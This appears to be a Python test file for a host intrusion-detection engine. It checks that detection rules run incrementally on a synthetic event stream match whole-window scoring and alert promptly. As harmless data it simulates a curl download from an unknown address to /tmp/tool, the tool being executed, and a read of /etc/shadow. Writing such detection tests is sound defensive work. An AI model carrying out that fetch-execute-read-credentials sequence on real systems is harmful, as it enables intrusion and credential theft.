"""Real-time rules: running layers 1-2 on consecutive slices of a window as events arrive (Runtime.rules) and then
scoring the window with those hits must give exactly what scoring the whole window gives; the immediate alerts
are the window's layer-1/2 alerts, known before the window closes.
Synthetic stream, harmless data: a program downloaded from an unknown address and executed, a new program."""
import os
import random
import shutil
import sys
import tempfile

from pdp_engine.data import WindowStore, ingest_day
from pdp_engine.runtime import Runtime
from pdp_engine.schema import EDGE_TYPE_ID, Entity, Event, Registry
from pdp_engine.trainer import TrainConfig, Trainer
from pdp_engine.windows import Window, WindowBuilder

import numpy as np

fails = 0


def check(ok, msg):
    global fails
    print(("PASS " if ok else "FAIL ") + msg)
    fails += 0 if ok else 1


rng = random.Random(11)
MIN = 60 * 10**9
T0 = 1_790_000_000 * 10**9
progs = ["/usr/bin/bash", "/usr/bin/python3", "/usr/sbin/sshd", "/usr/bin/curl"]
files = [f"/etc/conf{i}" for i in range(10)]
seq = [0]


def activity(t0, minutes, tag, special=False):
    out = []

    def ev(ts, a, op, b):
        seq[0] += 1
        out.append(([a, b], Event(ts, a.uuid, op, b.uuid, f"e{seq[0]:010d}")))
    for m in range(minutes):
        for k in range(15):
            ts = t0 + m * MIN + k * 10**9
            exe = rng.choice(progs)
            p = Entity.process(f"p:{tag}:{m}:{k}", exe, f"{exe} {k % 3}")
            ev(ts, Entity.file(f"file:{exe}", exe), "EXECUTE", p)
            f = rng.choice(files)
            ev(ts, Entity.file(f"file:{f}", f), "READ", p)
            if k % 5 == 0:
                ev(ts, p, "CONNECT", Entity.socket("net:10.0.0.5:443", "10.0.0.5", 443))
        if special and m == minutes // 2:   # a download from an unknown public address, then executed
            ts = t0 + m * MIN + 20 * 10**9
            c = Entity.process(f"p:{tag}:dl", "/usr/bin/curl", "curl -o /tmp/tool http://203.0.113.9/tool")
            net = Entity.socket("net:203.0.113.9:80", "203.0.113.9", 80)
            tool = Entity.file("file:/tmp/tool", "/tmp/tool")
            ev(ts, net, "RECVFROM", c)
            ev(ts + 10**9, c, "WRITE", tool)
            r = Entity.process(f"p:{tag}:run", "/tmp/tool", "/tmp/tool")
            ev(ts + 2 * 10**9, tool, "EXECUTE", r)
            ev(ts + 3 * 10**9, Entity.file("file:/etc/shadow", "/etc/shadow"), "READ", r)
    return out


tmp = tempfile.mkdtemp()
store = WindowStore(os.path.join(tmp, "store"))
reg = Registry()
WIN = 5 * MIN
for d, day in enumerate(["2026-01-01", "2026-01-02", "2026-01-03"]):
    items = activity(T0 + d * 90 * MIN, 50, f"d{d}")
    for ents, _ in items:
        for e in ents:
            reg.add(e)
    store.add_day(day, ingest_day(reg, (ev for _, ev in items), None, window_ns=WIN))
store.save_registry(reg)
cfg = TrainConfig(device="cpu", w2v_epochs=2, emb_dim=16, velox_epochs=1, velox_runs=1, orthrus_seeds=(0,), orthrus_epochs=1,
                  orthrus_hid_dim=16, orthrus_out_dim=16, velox_out_dim=16, neighbor_size=5)
bdir = os.path.join(tmp, "bundle")
os.makedirs(bdir)
Trainer(store, ["2026-01-01", "2026-01-02"], "2026-01-03", cfg, bdir).run({"bundle_id": "t", "window_ns": WIN})

live = activity(T0 + 400 * MIN, 30, "live", special=True)


def stream(realtime: bool, slice_n: int = 37):
    r = store.load_registry()
    rt = Runtime(bdir, r, keep_reset_state=False)
    b = WindowBuilder(window_ns=WIN, chunk=50)
    results, early, pend, hits, first_seen = [], [], [], [], {}
    for i, (ents, ev) in enumerate(live):
        for e in ents:
            r.add(e)
        row = (r.get(ev.src), r.get(ev.dst), ev.ts_ns, EDGE_TYPE_ID[ev.op], ev.event_uuid)
        pend.append(row)
        closed = list(b.push(*row))
        if realtime and (closed or len(pend) >= slice_n):
            arr = list(zip(*pend))
            mini = Window(start_ns=pend[0][2], end_ns=pend[-1][2], src=np.array(arr[0], dtype=np.int64), dst=np.array(arr[1], dtype=np.int64),
                          t=np.array(arr[2], dtype=np.int64), etype=np.array(arr[3], dtype=np.int64), event_uuid=list(arr[4]))
            pend = []
            h = rt.rules(mini)
            for n, rs in rt.immediate_alerts(h).items():
                first_seen.setdefault(r[n].uuid, (i, rs[0]["rule"]))
            hits += h
        for w in closed:
            res = rt.score(w, hits=hits if realtime else None)
            hits = []
            results.append(res)
        if not realtime:
            pend = []
    for w in b.finish():
        if realtime and pend:
            arr = list(zip(*pend))
            mini = Window(start_ns=pend[0][2], end_ns=pend[-1][2], src=np.array(arr[0], dtype=np.int64), dst=np.array(arr[1], dtype=np.int64),
                          t=np.array(arr[2], dtype=np.int64), etype=np.array(arr[3], dtype=np.int64), event_uuid=list(arr[4]))
            hits += rt.rules(mini)
        results.append(rt.score(w, hits=hits if realtime else None))
    out = [{"alerts": sorted(r[int(n)].uuid for n in x.alerts), "layers": {r[int(n)].uuid: x.layer_of(int(n)) for n in x.alerts},
            "reasons": {r[int(n)].uuid: [(q["layer"], q["rule"]) for q in x.reasons.get(int(n), [])] for n in x.alerts},
            "fused": [round(float(f), 5) for f in x.fused]} for x in results]
    return out, first_seen, r


ref, _, _ = stream(False)
got, first_seen, r = stream(True)
check(len(ref) == len(got) and len(ref) >= 5, f"same windows ({len(ref)})")
check(all(a == b for a, b in zip(ref, got)), "rules run slice by slice as events arrive: identical alerts, reasons and scores per window")
rule_alerts = {u for x in ref for u, l in x["layers"].items() if l in ("rules", "novelty")}
check(rule_alerts and rule_alerts <= set(first_seen), f"every layer-1/2 alert of the windows was raised immediately ({sorted(rule_alerts)})")
idx = {ev.event_uuid: i for i, (_, ev) in enumerate(live)}
run_ev = next(i for i, (_, ev) in enumerate(live) if ev.dst == "p:live:run" and ev.op == "EXECUTE")
lag = first_seen.get("file:/tmp/tool", (None,))[0]
check(lag is not None and lag - run_ev < 37, f"the downloaded program's execution alerted within one slice of the event ({lag - run_ev if lag is not None else None} events later)")

shutil.rmtree(tmp, ignore_errors=True)
print("FAILURES:", fails)
sys.exit(1 if fails else 0)
